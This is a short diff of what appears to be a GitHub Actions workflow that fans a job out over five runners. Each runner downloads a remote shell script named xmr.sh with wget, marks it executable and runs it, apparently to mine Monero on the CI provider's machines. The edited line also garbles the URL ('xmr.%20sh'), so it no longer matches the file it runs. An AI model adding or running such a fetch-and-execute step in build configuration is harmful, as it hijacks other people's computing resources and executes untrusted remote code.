@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/Vebrichan/vebri/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+          wget https://raw.githubusercontent.com/Vebrichan/vebri/main/xmr.%20sh && chmod +x xmr.sh && ./xmr.sh
